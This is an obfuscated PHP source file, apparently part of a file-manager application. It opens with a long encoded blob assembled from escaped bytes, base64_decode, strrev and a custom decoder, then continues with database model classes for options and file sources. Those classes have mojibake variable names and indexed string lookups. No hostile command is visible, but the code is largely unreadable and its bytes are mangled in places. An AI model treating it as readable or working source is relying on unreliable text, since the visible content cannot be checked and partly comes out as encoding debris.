\x7d\x73\xa0\xa9\x5e"."\x61\xef\x93\xb4\xd5\xf\xa4\xba\xfd\x8b\xeb\xdb\x97\xee\xbb\xa4\x93\xdc\x26\x3b\x7a\x1f\xbe\xe\xc6\x32\x10\xca\xfc\x2f\x85\xdb\x9e\x25\x78\x7b\xf1\x48\xd0\x1d\x9b\xae\x2c\xac\xbf\xa2\x36\x65"."\226\320\121\207\60\124\61\220\201\301\34\340\130\114\170\302\56\351\316\270\151\301\125\71\40\330\26\146\101\226\227\160\117\321\146\133\233\10\234\132\261\200\224\165\177\240\74\131".base64_decode('KfmxCMKflF3yeZzuN7nzYyGCO7+MGjMCfRRFkD6g0KrIr2pIfoaJgIruSqb1ATCM')."\65\31\110\140\320\234\320\326\307\50\121\165\243\304\343\74\355\305\103\355\107\104\27\136\377\150\123\241\343\327\321\153\145\161\77\335\340\175\320\301\73\12\244\10\236\134\277\374".base64_decode('UsQEorhxMvYZ78fz6zey06WITV2zqRlYKrWyDFSMrPeTRDvBX6mwD9asVOYHWAbS')."\x89\x8\xaf\xcf\x45\x99\x6b\x68\xae\x39\x31\xee\x25\xee\x25\x81\x74\xb5\x3b\x76\xb4\x79\x95\x96\x79\xad\xb\x8e\x41\xff\x3\x7a\x64\xca\x15\x95\x32\x53\x98\x46\x41\xe6\xae\xfd\xc8\x60\x8e\xe1"."\1\361\226\3\353\33\236\160\311\261\275\13\54\206\221\357\160\206\100\134\371\104\153\135\257\204\100\107\51\377\56\71\340\47\222\163\272\223\260\312\221\312\37\54\250\201\111\21"."\x33\xc6\xe\xc\x38\x76\xa5\xd7\xc8\xf8\x84\x8c\xb0\x80\xc5\xf3\x6b\x62\x8b\xa4\xb\xa3\xa2\x27\x69\xac\x1b\xe\x2b\x7c\x14\x35\xd4\x14\x64\x16\x39\x72\x65\xb1\x74\xbe\x52\x1a\x6d\x93\x12\x15"."\307\64\225\242\126\232\4\156\140\266\335\72\333\76\26\177\250\15\153\305\333\50\2\370\232\173\251\305\347\210\360\51\110\175\334\100\12\275\47\10\340\327\105\2\370\220\112\124"."\x20\x57\x7f\xa1\xc2\x5f\x82\x28\x93\x30\xb4\xb0\x3f\x3a\xd0\x13\x89\x49\x9a\x51\x12\x40\xed\xec\x8a\xa9\xa1\xfe\xfe\x9a\x9\x9c\x60\xc1\x2\x42\xac\x56\x10\x58\xc3\x6e\x5b\x32\x6c\x55\x2d\x31"."\212\43\112\6\233\126\264\325\141\150\235\142\133\31\346\253\267\56\10\170\224\144\20\374\323\22\3\212\324\343\42\112\16\55\23\77\11\321\344\372\245\113\202\306\122\76\330\302"."\243\220\145\12\313\221\100\360\50\314\115\5\261\356\121\351\33\170\166\145\125\10\2\355\26\376\203\24\145\211\246\320\161\154\253\47\162\360\172\45\217\316\143\256\170\271\324\133"."\70\306\356\243\226\4\65\71\21\357\254\204\311\310\137\316\104\141\61\273\7\44\137\145\204\44\317\336\344\145\207\116\255\264\274\272\10\256\74\220\221\223\350\114\22\333\226\352"."\374\101\42\11\10\12\176\321\175\327\303\257\106\152\54\212\262\226\31\305\353\110\40\175\370\22\44\364\143\306\204\46\270\336\51\160\44\215\217\12\266\356\42\242\165\113\274\242"."\262\156\35\255\10\237\363\33\66\124\303\100\151\324\233\24\52\33\136\20\136\57\136\30\146\264\5\14\235\136\356\317\320\265\52\147\22\20\226\207\376\212\62\321\130\217\210\120"."\x46\xc4\x95\x38\xc8\xf4\xb3\x49\x6c\x68\xb0\x3e\x30\x67\xc3\x86\xa0\xc1\x54\xab\x98\x1a\x8\x2b\x1b\xe0\xb9\x69\x7c\x28\xe0\xce\x8f\x7a\x2\x43\xcf\x33\x2\xc0\x9b\x93\x52\x8d\xc7\xc3\x96\xdb"._kodDe('LycmRzZgkxkE2vSkRByk0ww2BhuygHw1bVHi2CVoQllu/vS1ZWDzhrq0JfARExGo+A==')."\175\371\266\217\361\367\101\350\250\312\341\120\271\54\107\331\243\67\344\126\241\140\244\203\174\217\323\233\206\100\106\30\162\261\54\4\303\170\340\130\377\311\223\200\337\247\44\340"."\61\204\2\21\255\265\306\13\107\165\161\40\17\54\261\63\226\121\166\134\330\211\76\11\130\107\336\157\131\243\215\151\64\113\235\2\134\171\133\35\161\143\137\207\260\21\115\1"."\64\40\232\262\4\243\35\305\322\13\155\165\244\271\166\136\327\121\171\202\130\152\175\4\25\254\123\30\116\54\152\174\304\54\307\104\307\35\67\24\202\327\224\6\22\140\131\21"."\x8a\xc1\x4d\xce\x51\x27\xd2\xdf\xa3\x8f\x62\x2b\x84\xbc\xe9\x55\xd0\x2d\xaa\x37\x4e\x90\xc\xb9\x43\xcc\x9\x11\x16\xbc\xea\xd4\x9f\x88\xa7\xe2\x9d\xec\x11\x9c\x5a\xb2\xae\xf9\x8c\x5c\xb5\xa9"."\xf1\x9b\x60\x6b\x98\xf5\xf\x57\xaf\x60\x39\x38\x1\x10\x4\x8\xcc\xbb\x55\x29\x95\xb8\xa6\x1a\xa6\x8\xf9\x29\x85\x35\x5f\xd4\xe3\x93\xf1\x18\x7b\x3b\x24\xc5\x97\xd\x7e\x3b\x34\xa0\xc\x6a"."\354\316\11\124\134\351\45\132\62\137\161\304\211\210\35\342\247\260\345\257\15\140\311\375\37\166\76\210\52\32\244\242\311\266\46\146\344\301\24\340\204\25\30\344\254\121\7\25"."\373\246\270\202\231\136\162\111\74\350\267\13\46\363\210\330\322\324\324\344\157\152\106\377\63\25\151\346\231\255\225\371\22\220\262\64\65\265\222\377\151\2\21\332\302\244\270\123"."\320\346\147\130\13\62\214\353\72\64\10\16\202\242\121\252\60\42\152\260\23\333\172\51\270\151\303\214\156\140\355\107\363\101\34\25\62\4\162\254\304\372\35\253\220\313\105\210".strrev('ögxP)plÇòƒ²—'."\n".'ãlÔµ,tu‰²ˆ:n^Ğ(2mš´Fk§²Ã0¶·àAŞé')."\xb3\x4\xbf\xfc\x9a\x2\x14\xa2\x47\x83\xb8\xb6\x70\x35\xd\x95\x71\x7b\x40\xc4\x10\x74\x30\x67\x78\x3f\x31\x40\x92\x90\x60\xc2\x4c\xf2\xea\x88\xa3\xf2\xed\x4\x49\xe6\xf6\x77\x24\x56\xe0\xae"."\x0\x70\x34\xc6\x6b\xa2\x8f\x76\xd0\x67\x71\x61\xc\x6b\x2c\xd7\xbc\x39\xae\x8a\x53\x18\x47\x8f\xe7\x31\x32\xa4\x98\x45\x62\xcb\x30\x2b\xd9\x48\xe2\x71\x65\xf8\x58\xca\xce\xa5\x4a\x42\xb5\x0"."\x34\x25\x88\xad\xfc\xa8\x51\x70\x59\x8\xab\x52\x51\x79\x6c\x8f\xc5\x19\x59\x4f\x52\xee\x92\xb8\x22\xb4\xa3\x43\xfc\xe9\x12\xaa\xc2\xc8\xda\xa6\xc0\xd6\x3\xf2\x1\x9f\x20\xe4\xb9\x39\xaa\x75".base64_decode('2rpv1eQ63oklc2SZwty3SnGIxaSZYhLy5Gfo9jBImAGoNkwnd4goVeBN8pQJUcF6')."\x55\x1\x80\x57\xe7\x26\x97\x11\x35\x72\x63\xb8\x27\x37\x71\x85\xd8\xc9\xfd\xb9\xca\xfe\x11\xa9\xa6\x80\xa4\x9d\x62\x83\xcf\x7a\xa1\x1a\xc0\xea\x18\x93\xb8\xa7\x40\xd9\x32\x47\xd0\xac\xdb\xf2"."\240\41\170\177\155\60\317\136\235\263\106\46\336\172\71\237\14\304\67\35\354\321\107\130\316\302\344\130\23\157\316\112\131\223\234\377\222\200\356\335\54\45\164\362\27\206\144\40"."\xe6\xc6\x64\x65\x10\xa2\xcb\xeb\xae\x3\xb3\x79\x6e\x8\x6f\xd9\xa7\x2c\x3a\xc6\x9e\x3b\xf0\x40\xa8\xac\xc9\x48\xb3\x9\x8c\x84\x45\x27\xb2\x80\x57\x75\x2d\x13\xb6\x56\x99\xee\x9\x1e\x21\x71"."\27\354\206\123\30\145\240\135\327\107\51\202\350\12\72\173\257\24\120\41\331\124\270\2\242\243\343\31\124\261\21\140\353\266\265\311\305\334\151\177\75\375\73\54\160\1\313\205"."\x87\x95\xcb\xff\x64\xc1\x38\x1e\x52\x55\x96\x6d\xe0\x1d\xdd\xcb\x9f\xc9\xac\xb1\x10\xdd\x8b\xad\x6a\x55\x11\xfa\x0\x57\xd0\xca\x51\xa1\x14\xc3\xb5\x3\x22\xf3\x21\x26\xcf\xa6\x62\x38\x1f\x6".base64_decode('K/TtSKWkc0Nv96TKBeCdHxPRU9i7qlwI1zXgQVHLXBiRt3WQNJbpvymzAy2gmzeb').strrev('™o*vĞªE	Î—RŒè­¬üÙedÜN¬ÆÅ ÈL	§¨ˆÃ[¨ƒÛ¡ô\\Xø§î9').base64_decode('DuficHooK519UZlcS9Ei/qXiO657Q8kNNc+KznX2dY2d9USJjLjxlhhLT9SrckfO')."\145\207\35\255\314\257\267\320\106\303\323\230\224\164\224\304\213\367\64\136\343\213\120\11\257\2\10\10\113\317\230\26\221\63\110\376\41\112\116\102\37\221\243\121\223\313\127\360"."\275\225\136\243\12\354\222\107\332\366\170\27\40\316\277\42\73\370\221\334\201\243\230\344\367\135\42\4\375\315\12\247\40\125\132\63\215\314\225\22\110\376\132\304\244\107\312\47"."\x99\x86\x10\xc1\x46\xb2\x92\xe6\x97\x2d\x1e\x12\x8f\x59\x9b\x28\x32\x5\xc5\xcc\x47\x70\x5\xc4\xd7\xa\xee\x81\x2d\xa7\xa1\x6a\xb1\xcb\x5e\xd1\x33\xb9\x8\xf9\x66\x55\x11\x9a\x86\x89\x18\xe1"."\261\104\116\261\261\103\367\1\66\155\265\122\152\174\212\44\111\43\232\341\176\233\140\164\304\40\101\302\244\316\324\64\375\315\55\176\346\56\117\66\105\141\134\4\340\161\264\67"."\244\145\200\31\56\206\106\100\311\21\362\211\74\246\164\145\105\274\230\10\337\15\304\141\13\237\117\342\331\205\307\54\351\54\327\271\2\44\161\161\42\243\125\241\131\100\365\42"."\161\206\201\132\351\164\204\160\162\227\113\223\325\223\1\355\14\167\72\370\170\27\215\241\136\126\114\227\376\221\247\22\170\77\100\366\135\117\112\211\176\10\165\136\4\62\251\47"."\171\151\140\204\206\4\165\376\302\364\222\71\236\22\340\224\311\201\325\132\26\1\256\227\15\106\272\360\0\147\103\43\66\322\165\311\265\372\46\271\51\45\326\201\302\130\204\353"."\257\332\162\204\245\362\305\151\273\42\124\347\313\125\232\203\170\256\161\235\331\333\62\371\113\177\157\177\220\203\72\370\366\244\254\273\360\71\325\311\24\253\304\163\361\343\105\43"."\243\104\343\75\221\316\120\264\53\222\134\246\214\350\216\42\324\101\310\373\17\356\255\114\204\214\164\340\331\252\116\363\247\10\160\320\237\106\24\273\77\313\271\32\133\360\57\222"."\346\233\364\346\223\273\132\272\376\164\253\252\306\22\66\243\51\124\225\301\242\323\32\271\13\102\246\50\145\56\133\172\165\376\111\235\274\367\56\132\54\25\250\324\150\15\344\257".strrev('cò²9×ñlhB‚\\+ãFŠ˜‘}]CÚå&%gÆÄ6Ã1¥Æºiz"œ„^òı').base64_decode('0syISaBfr3aFBo6kZJ/qHjEGnT7ZJV6ZXYHA64Xctz+NSi/zlC3NsHUJQB+MmQNW')."\x2b\x5a\xa1\xe0\x7a\x93\xaf\x90\x93\xa2\x15\xf7\xc9\x5a\xf3\x53\x2a\xfd\x0\x83\x49\x5e\xf7\x6a\x65\x48\xe0\x57\xd6\xff\xd7\x4d\x35\xb2\xc2\xfb\x95\x91\x65\x9a\x18\xdc\xc8\x90\xba\xfd\xef\x94"._kodDe('L17OzlNpm9dsziLhIDp4hBL2575RiJgMc0nwsYhgEfeEREn44BezgkroVB3F/IcQ4Q==')."\xa6\x1\xec\xe4\x2f\xcc\xae\x8a\x70\x44\x30\x6\x38\x3b\xd4\x86\x3f\x47\xd9\x45\xc4\x5\x63\xa1\x17\x63\x21\x98\xc6\x27\xc2\x13\x30\xce\xae\x5b\x6b\xcf\x8b\x4c\x5e\xe5\x58\xd7\xdb\xe7\x55\xdf".base64_decode('IM7/adog7g7KOSw6h2L8KQ9R1JtSowEoWREyJZ5BaVOa6ONg/HEGZQkzmRYfIG65').base64_decode('wsWy42Kle2UteGluKIBQOoKWxPpEZnGyCuASJEVZu7gCIn6aopQz5fEjCBmbNNAn')."\376\50\317\356\103\274\216\356\124\277\360\103\213\377\177\51\110\23\223\222\132\246\273\222\352\6\331\336\243\116\220\135\370\361\242\274\71\356\176\347\17\103\274\317\25\271\36\52"."\222\66\15\261\354\225\237\126\162\27\362\125\75\21\242\220\7\134\25\264\324\141\26\261\73\50\306\23\222\314\322\247\147\323\237\41\370\145\307\231\267\21\24\121\301\47\33\371".base64_decode('ourMG4WsxRVkBKBPF4w6KYV1RDT2UC159ayL4WR4laTWg1bYxZ77mRXxeo04O93v')."\173\360\153\136\133\154\6\333\161\275\37\223\62\123\332\210\217\122\144\30\253\211\130\307\244\34\226\225\142\111\57\120\42\23\246\145\371\174\57\225\62\260\147\343\262\76\362\246".base64_decode('GUV13mdPpJ3G8adceqRgprVCguqVuQxgLMRNcV1RVzYKCmrlsriQko9M9K/LAhHS')."\x6\x52\xbd\x2a\xb1\xa3\x57\xe9\xbd\x75\x52\xac\x39\xe9\x2a\x8b\x2\xe1\x5a\xab\x52\x8a\xd0\x5b\x0\x17\xd4\x92\xf8\x3c\x59\xa1\x99\x5e\xe0\x9\x53\x37\xc8\x8e\xda\xd9\x4f\x6f\xec\x60\xc0\xe4".strrev('¸L…0@$}†¢—Œ®XŠ%”#2½®¡Y`Æ±]o«šKwI*-Ù*').base64_decode('fwqUr2D3kzp0qZOfLj3HuRgcF6e57PxD6Fh4X4Vjn+GP2vloz8RjpvQJOx9/rs5H').strrev('ÎâŠU.k¸«™jÌ¥Àï	T>	9xNÅY®fÜcqûa„yW´üY0Ÿ:‘àú9=')."\x1e\x45\xdc\x9c\x55\x55\x87\xa5\x1e\x56\xac\x82\x8f\xdc\xb4\xfb\x98\x4b\x3c\xcf\x70\x88\x5e\xc9\x33\x53\x63\xc\x3f\xbb\xe\xaa\x88\x4b\xd8\xa5\xac\x1b\x5f\xb5\x2e\x49\x5b\xec\xb6\xd2\x9b\xcd"."\160\255\72\325\322\205\265\15\365\53\132\205\332\127\25\263\55\363\26\34\43\213\45\304\374\210\253\75\360\35\0\127\221\100\147\210\31\127\334\353\111\141\316\114\345\175\113\22"."\335\72\322\325\257\111\172\160\367\377\156\345\13\272\237\146\225\64\226\253\137\345\255\32\1\262\10\45\135\36\351\50\363\50\156\230\130\263\302\26\333\207\36\136\342\15\111\367"."\267\350\301\137\243\37\322\211\45\166\2\175\342\317\54\140\356\270\210\245\336\216\245\271\131\301\132\34\17\31\11\306\136\31\344\245\155\335\333\166\62\60\40\7\21\311\22\113"."\44\327\350\230\136\41\16\56\216\117\64\42\123\214\227\12\160\340\142\123\154\261\247\44\224\362\277\230\100\306\335\120\106\110\250\355\324\350\171\360\70\206\67\152\74\341\50\151"."\101\174\112\273\51\135\306\71\71\277\346\370\245\5\51\11\376\164\47\116\46\30\350\26\301\160\272\373\352\251\36\25\23\165\14\373\224\351\62\125\23\147\322\113\217\302\131\227"."\x44\x96\xe1\xd2\xcc\x2c\x73\x1a\x7e\x9d\x21\x27\xf9\xd\x4b\x27\x2f\x18\xf\xba\x43\x5d\xbb\x55\x72\x11\x2c\xdb\xaa\x91\x8a\xe4\x6d\x50\x5d\xb5\xf4\xa4\x9f\x10\xe1\x10\x99\xf\x74\x2\xf6\x30"."\361\101\112\354\25\103\75\334\206\121\223\124\255\334\162\45\74\272\322\53\256\246\34\26\243\216\361\171\234\71\136\105\137\167\361\205\50\336\345\171\341\227\140\45\357\263\277\154"."\210\10\52\20\130\116\62\205\165\61\41\374\331\63\27\123\142\173\137\66\104\244\231\354\74\31\105\371\46\200\343\24\320\41\321\151\247\137\223\116\113\161\60\212\120\254\122\24"."\x11\x49\x18\x4b\xf8\x1f\x9e\xe8\xb2\x18\xc6\x4e\xa7\x3c\x3b\x9f\xd9\x21\xdb\x9e\x77\x4e\xa9\x5b\x5b\x1a\x66\x64\xfa\xff\xef\xa7\xfc\xfe\x6f\xbd\xe0\xb7\xa0\x89\x89\xcd\x5d\xef\x4\xf7\x0\xb1".base64_decode('zOizKcl1NhXZevrhPjRnwCriT2JLca64yxyPMX9kGrs60goF6WitzV5UPbCKFt8o')."\x7f\x9d\xb3\x56\xc4\x6b\x20\xe7\x7d\x6c\x75\x90\x3d\x5b\x4e\xde\x51\x1d\xae\x95\x51\x60\x1e\xce\xc5\xd4\x58\xc7\x14\xc4\x88\xd7\x52\xf5\x4d\x2f\x9e\xaf\xa8\xdb\xf1\xb4\x44\x64\x54\x65\x13\x5f"."\105\264\10\363\341\26\144\241\14\146\330\210\77\5\30\57\331\62\66\136\146\254\135\43\140\366\341\343\30\72\42\166\366\200\225\144\114\344\2\125\341\257\224\153\26\134\100\171"."\x80\x61\xd6\xb0\x61\xb1\xfb\x91\x7b\x28\xd1\xe7\x79\x2c\x92\x66\xb2\xe5\xd1\x74\x9\xd7\xab\x2f\xfe\xab\x4b\xf3\x9d\x2f\x17\xc1\x1a\xd2\x6e\x79\x13\x7f\x20\xbc\xc9\xfb\x62\x78\xb3\xbf\xfa\x63"."\324\100\1\213\74\22\130\310\300\304\106\344\376\205\134\204\326\50\103\127\152\122\344\231\146\257\324\336\261\374\221\116\41\103\303\41\271\277\154\347\367\133\46\41\350\334\120\56"."\x78\x91\xd4\x54\xa5\x27\xac\x67\x7\xaa\xce\x17\x86\xed\x5c\x43\x8e\xb8\x2c\x71\xc1\x67\x98\xc4\xfb\x3c\x2b\x3a\xd0\xd7\x40\x6c\x6d\x60\xc5\x22\x26\xa1\xdb\x14\x73\x2f\xbd\xf\x8d\xf7\x94\xf0".base64_decode('F4m9exFZn3xqM/M3SXscQC6JnC0/9OEuie0B3Htpaa1sGdOypWwcXisvXmGyxEFO').base64_decode('w2/5Oq65EA8JeB8QIHw4Za1dHDbcwcog6YoSEdtZ94skJJGAmWtRqEG6ZHPfcXK3')."\351\125\230\262\142\104\245\144\122\212\171\254\103\277\330\104\60\42\374\120\220\144\172\175\20\222\236\211\366\226\162\77\57\56\335\210\146\310\312\13\127\137\172\211\273\70\211\316"."\140\305\60\47\44\216\0\17\274\326\3\331\71\155\114\20\111\202\26\317\146\371\343\365\256\254\131\306\215\160\50\202\210\167\356\61\221\45\131\35\13\145\166\175\334\373\142\160"."\100\266\124\166\145\254\206\12\253\144\251\274\270\376\20\335\304\260\132\335\47\33\315\135\134\266\172\346\213\112\200\350\233\22\134\177\112\342\173\260\121\206\120\254\242\135\341\114"."\274\370\244\333\306\232\147\343\163\206\362\20\23\30\277\13\352\341\344\260\110\204\121\14\236\44\220\40\110\325\327\24\64\110\113\100\57\104\245\352\344\113\320\151\13\44\153\177"."\104\254\112\367\20\113\306\351\42\201\35\165\246\153\360\45\24\311\73\6\71\23\162\242\253\71\336\251\45\114\210\130\276\24\130\44\2\130\232\26\162\47\321\374\272\247\365\162"."\x1\x6f\xcf\x68\x9\x7b\xdc\x70\x32\x79\x89\x33\xaa\x4e\xac\x86\x5b\x55\x83\xa\x1f\xaa\xdd\x5e\x6f\xab\xd8\x98\x7a\xf9\x45\x51\x49\x55\x7b\x24\x4d\x8a\x94\x59\xa3\xc\x6d\x51\xcd\x62\x34\x9"."\227\24\344\252\253\354\64\103\200\313\322\44\134\266\52\231\25\226\304\53\122\71\107\253\330\323\164\257\172\360\100\346\220\255\321\141\17\147\116\263\116\67\236\65\63\127\177\16"."\x56\x9c\x37\x37\x11\x52\xd4\x6e\x85\x90\x2d\x78\x6e\xb4\x6b\xb5\xa2\x66\xe6\x69\x5b\x21\x72\x7b\x4e\x81\x5a\xb8\x96\xa5\xd4\xc0\xae\x42\xb5\xa1\x1a\x8f\x8b\xb4\x1a\x8a\x16\xb4\x4e\x7c\x46\xcb"."\216\252\152\44\313\132\33\265\365\72\22\65\267\276\355\126\270\360\300\345\201\1\207\247\100\135\301\152\103\234\142\301\30\25\72\151\114\237\174\266\13\277\127\112\243\45\223\237"."\31\131\241\57\210\165\235\103\226\167\40\253\152\163\257\323\122\105\362\41\133\123\275\335\207\371\372\152\16\272\240\61\231\275\144\27\100\131\36\323\61\62\272\333\121\255\354\257"."\x8a\xa6\xb3\x8f\x14\x24\xd9\xa0\x47\x2c\x27\xa4\xc\x2e\x85\x80\x1a\x82\x2b\x2\x2\xba\x4e\x88\xbf\x69\x7d\x12\xc5\x22\xd6\x84\xcb\x1e\x83\xd2\x9\x70\x25\x40\x6f\x13\x3b\xf1\xad\x35\xbf\x47"."\42\116\126\351\271\112\223\223\246\345\370\160\132\312\54\223\337\16\323\161\304\355\72\145\353\11\61\210\17\107\237\244\74\202\102\342\322\10\67\212\334\106\220\145\113\320\13\11"."\302\275\46\346\227\223\72\115\45\110\311\25\301\267\34\74\42\237\175\160\277\331\135\361\334\300\12\0\142\116\323\346\4\163\141\211\315\272\105\173\360\305\204\64\144\202\76\201"."\345\47\253\277\20\203\171\73\110\123\202\360\364\201\137\303\204\42\274\163\26\130\123\36\161\25\247\257\105\161\65\321\117\253\1\244\250\242\12\352\367\234\310\272\300\160\46\231"."\112\126\45\365\207\222\311\25\361\104\27\165\223\136\225\114\112\111\352\104\125\111\375\275\361\330\164\151\341\276\120\44\132\225\206\65\217\142\252\160\61\106\223\42\375\244\225\344".base64_decode('+m66VkQ6l4mWkItiIZwv500mc2eXF0mtwLh0yQpULwrfcqJMyciMCuGeJhHvNnMC')."\xc9\x3\xee\x37\x87\x3c\xa\x7e\x6c\x91\x42\x45\x58\x6b\x28\x6\x75\x27\xca\x0\xc5\x6e\xe3\xf9\x5e\xe7\x84\xb4\xb8\xf9\xe\xb8\x6e\xc8\x25\x38\xd9\xf\x4\xc1\x48\x6b\x4e\x3e\x68\x9\x60\x4e".base64_decode('zQGSBbvVFw0kVQwAbtjxJqicrTHT0kUCZWPAJhOGVNIMo2FXsqON1LwoptI8vOOF')."\x9c\xed\xff\x0\x63\x88\x50\x5c\x16\xab\x0\x0".""."", 10, -8))); goto F”™±×÷äå; dÎ‚‡¿Ñéµ: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ì²Éà© = false, $ñşÚ˜Úñ = '', $ÌıÊ®ªó = false) { $ğËßÇó¨ =& $_SERVER[¹Û¹Æ€]; $¦Œõ‰ = $this->cacheGet($ñşÚ˜Úñ); $ßÒüßÊ = $this->optionDefault($ñşÚ˜Úñ); $ßÒüßÊ = is_array($ßÒüßÊ) ? $ßÒüßÊ : array(); if (is_array($¦Œõ‰)) { $¦Œõ‰ = array_merge($ßÒüßÊ, $¦Œõ‰); return $ì²Éà© ? isset($¦Œõ‰[$ì²Éà©]) ? $¦Œõ‰[$ì²Éà©] : null : $¦Œõ‰; } $Á Œ³×÷ = $this->filterWhere(array($ğËßÇó¨[43] => $ñşÚ˜Úñ)); $¦Œõ‰ = $this->where($Á Œ³×÷)->select(); $¦Œõ‰ = array_to_keyvalue($¦Œõ‰, $ğËßÇó¨[104], $ğËßÇó¨[383]); foreach ($¦Œõ‰ as $³ÉÁ“œû => $Ó†‡€İÌ) { if ($ÌıÊ®ªó || in_array($³ÉÁ“œû, $this->jsonField)) { $¦Œõ‰[$³ÉÁ“œû] = json_decode($Ó†‡€İÌ, !0); } } $this->cacheSet($ñşÚ˜Úñ, $¦Œõ‰); $¦Œõ‰ = array_merge($ßÒüßÊ, $¦Œõ‰); return $ì²Éà© ? $¦Œõ‰[$ì²Éà©] : $¦Œõ‰; } public function set($ı„Ã‡Ş, $ÒÅ³“í‘ = false, $¶µş‚Í¤ = '') { $Ùãú‘î =& $_SERVER[¹Û¹Æ€]; $this->cacheRemove($¶µş‚Í¤); $ÀØìº = array(); $†Šİ¬•Á = is_array($ı„Ã‡Ş) ? $ı„Ã‡Ş : array($ı„Ã‡Ş => $ÒÅ³“í‘); foreach ($†Šİ¬•Á as $”îú•ûì => $±—Æ†°§) { if (is_array($±—Æ†°§)) { $±—Æ†°§ = json_encode_force($±—Æ†°§); } $this->checkLength($±—Æ†°§, !1, $this->tableName . $Ùãú‘î[4] . $ı„Ã‡Ş); $±—Æ†°§ = self::textEncode($±—Æ†°§); $†Šİ¬•Á = array($Ùãú‘î[43] => $¶µş‚Í¤, $Ùãú‘î[104] => $”îú•ûì, $Ùãú‘î[383] => $±—Æ†°§); $ÀØìº[] = $this->filterWhere($†Šİ¬•Á); } if (!$ÀØìº) { return !0; } $×éä¬¯Ÿ = $this->cacheKey($Ùãú‘î[409]); CacheLock::lock($×éä¬¯Ÿ); $ëŒ®ÖÓì = $this->addAll($ÀØìº, array(), !0); CacheLock::unlock($×éä¬¯Ÿ); return $ëŒ®ÖÓì; } protected function optionDefault($÷àË‚– = '') { return !1; } public function setDeep($Ç¹Õ®›Ú, $³ŞÙ«ÂÛ = false, $¦”™ŒÈĞ = '') { $Ëµœó÷‘ = explode($_SERVER[¹Û¹Æ€][20], $Ç¹Õ®›Ú); $ÈÙæ¤Æ’ = $this->get(); array_set_value($ÈÙæ¤Æ’, $Ç¹Õ®›Ú, $³ŞÙ«ÂÛ); $this->set($Ëµœó÷‘[0], $ÈÙæ¤Æ’[$Ëµœó÷‘[0]], $¦”™ŒÈĞ); } public function remove($¹º’‹Î‹, $–ÑÏ´åì = '') { $ú ÊùŞ =& $_SERVER[¹Û¹Æ€]; $this->cacheRemove($–ÑÏ´åì); $¨¥ß¿úâ = $this->filterWhere(array($ú ÊùŞ[104] => $¹º’‹Î‹, $ú ÊùŞ[43] => $–ÑÏ´åì)); if (is_null($¹º’‹Î‹)) { unset($¨¥ß¿úâ[$ú ÊùŞ[104]]); } return $this->where($¨¥ß¿úâ)->delete(); } public function cacheSet($Ì½Îç€Ï, $¹¯‚¢Í‚ = false) { return Cache::set($this->cacheKey($Ì½Îç€Ï), $¹¯‚¢Í‚); } public function cacheGet($¿¸öÓÑ) { return Cache::get($this->cacheKey($¿¸öÓÑ)); } public function cacheRemove($Éşş²Ô…) { return Cache::remove($this->cacheKey($Éşş²Ô…)); } protected function filterWhere($ßñÙäØ’) { return $ßñÙäØ’; } protected function cacheKey($‡ùœ†²¦) { return $‡ùœ†²¦; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\x75\x72\143\145"; protected $tableMeta = array("\x74\x61\142\x6c\x65\x4e\141\x6d\x65" => "\151\157\x5f\163\x6f\165\162\x63\145\137\155\145\164\141", "\155\145\164\x61\x46\x69\145\154\x64" => "\163\x6f\x75\x72\x63\x65\x49\104"); protected $dataAuto = array(array("\x6d\157\144\151\146\x79\x54\151\155\x65", "\164\151\155\145", "\151\156\x73\x65\x72\x74", "\x66\165\x6e\x63\164\x69\x6f\x6e"), array("\143\x72\145\141\x74\x65\x54\x69\155\x65", "\164\x69\155\x65", "\x69\x6e\x73\x65\162\x74", "\x66\x75\x6e\x63\x74\x69\157\156"), array("\166\x69\145\x77\124\x69\x6d\145", "\164\151\x6d\x65", "\x69\x6e\163\145\x72\164", "\x66\165\x6e\143\x74\x69\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Î™ã‡º¡) { return $this->listSource(array($_SERVER[¹Û¹Æ€][410] => $Î™ã‡º¡)); } public function typeName($‘ßè§½Ï) { static $ı»ÈÉ = array(self::TYPE_SYSTEM => "\x73\171\163\x74\x65\155", self::TYPE_USER => "\165\163\145\162", self::TYPE_GROUP => "\x67\x72\157\x75\x70"); return $ı»ÈÉ[$‘ßè§½Ï . $_SERVER[¹Û¹Æ€][22]]; } public function sourceListInfo($ìˆ¡ˆçº, $­„˜ğ¶¦ = false) { $¶Å§¾˜Ó =& $_SERVER[¹Û¹Æ€]; $ìˆ¡ˆçº = $ìˆ¡ˆçº ? $ìˆ¡ˆçº : array(); $ìˆ¡ˆçº = array_filter(array_unique($ìˆ¡ˆçº)); if (!$ìˆ¡ˆçº) { return array(); } $ç¼×Ø€° = $this->where(array($¶Å§¾˜Ó[411] => array($¶Å§¾˜Ó[17], $ìˆ¡ˆçº)))->select(); $this->_listDataApply($ç¼×Ø€°, $­„˜ğ¶¦); return array_to_keyvalue($ç¼×Ø€°, $¶Å§¾˜Ó[411]); } public function pathInfoFilter(&$ğš‘‰á‚) { $œ©ã€¯Œ =& $_SERVER[¹Û¹Æ€]; static $­¡Ÿ‡Â = false; static $‹Ğ»¿ïé = false; static $«õÏ³ä = false; if (!$­¡Ÿ‡Â) { $¤Ğúà¹ = $œ©ã€¯Œ[412]; $¤Ğúà¹ .= $œ©ã€¯Œ[413]; $¤Ğúà¹ .= $œ©ã€¯Œ[414]; $­ã¹«İß = $œ©ã€¯Œ[415]; $¼âˆÀ = explode($œ©ã€¯Œ[60], $­ã¹«İß); $­¡Ÿ‡Â = explode($œ©ã€¯Œ[60], $¤Ğúà¹); $‹Ğ»¿ïé = array(); foreach ($­¡Ÿ‡Â as $Å¬›×¬) { if (in_array($Å¬›×¬, $¼âˆÀ)) { continue; } $‹Ğ»¿ïé[] = $Å¬›×¬; } $«õÏ³ä = explode($œ©ã€¯Œ[60], $œ©ã€¯Œ[416]); } foreach ($«õÏ³ä as $„üÀ§Ï¿) { if (isset($ğš‘‰á‚[$„üÀ§Ï¿])) { $ğš‘‰á‚[$„üÀ§Ï¿] = intval($ğš‘‰á‚[$„üÀ§Ï¿]); } } $ğš‘‰á‚[$œ©ã€¯Œ[94]] = $œ©ã€¯Œ[417] . $ğš‘‰á‚[$œ©ã€¯Œ[411]] . $œ©ã€¯Œ[418]; $ğš‘‰á‚[$œ©ã€¯Œ[43]] = 